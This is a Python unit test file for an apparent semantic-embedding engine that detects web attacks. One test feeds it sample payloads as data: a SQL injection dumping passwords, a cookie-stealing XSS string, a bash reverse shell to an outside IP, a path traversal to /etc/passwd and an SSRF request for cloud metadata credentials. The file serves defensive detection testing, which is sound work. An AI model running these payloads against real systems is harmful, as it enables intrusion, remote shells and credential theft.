"""
Unit Tests for Semantic Embedding & Vector Cosine Similarity Engine (Layer 3 Spec).
"""

from bastion.semantic.embedding_engine import SemanticEmbeddingEngine, Vectorizer


def test_vectorizer_normalization():
    vec = Vectorizer.vectorize("SELECT * FROM users WHERE id=1")
    assert len(vec) > 0
    # Verify L2 unit norm (sum of squares == 1.0)
    norm = sum(v * v for v in vec.values())
    assert abs(norm - 1.0) < 1e-4


def test_cosine_similarity_calculation():
    vec1 = Vectorizer.vectorize("SELECT * FROM users UNION ALL SELECT")
    vec2 = Vectorizer.vectorize("SELECT password FROM accounts UNION SELECT")
    sim = SemanticEmbeddingEngine.cosine_similarity(vec1, vec2)
    assert sim > 0.45


def test_semantic_embedding_detection_on_attack_paraphrases():
    # Attack variations that resemble reference archetypes
    attacks = [
        ("1' UNION ALL SELECT null, email, password FROM members--", "SQLi"),
        ("<svg/onload=alert(document.cookie)>", "XSS"),
        ("; /bin/bash -i >& /dev/tcp/192.168.1.1/8080 0>&1", "RCE"),
        ("../../../../private/etc/passwd", "LFI"),
        ("http://169.254.169.254/latest/meta-data/credentials", "SSRF"),
    ]

    for attack_str, expected_cat in attacks:
        score, cat, archetype = SemanticEmbeddingEngine.evaluate(attack_str)
        assert score >= 4.0, f"Low semantic score for {attack_str}: {score}"
        assert cat == expected_cat or cat != "Clean"


def test_semantic_embedding_clean_traffic_low_score():
    clean_texts = [
        "Welcome to our home page and portfolio",
        "How can I contact customer support?",
        "Please select a subscription tier from the list below",
        "The item was added to your shopping cart successfully",
    ]

    for clean in clean_texts:
        score, cat, _ = SemanticEmbeddingEngine.evaluate(clean)
        assert score < 2.0, f"Unexpected high semantic score for clean text: {clean} -> {score}"
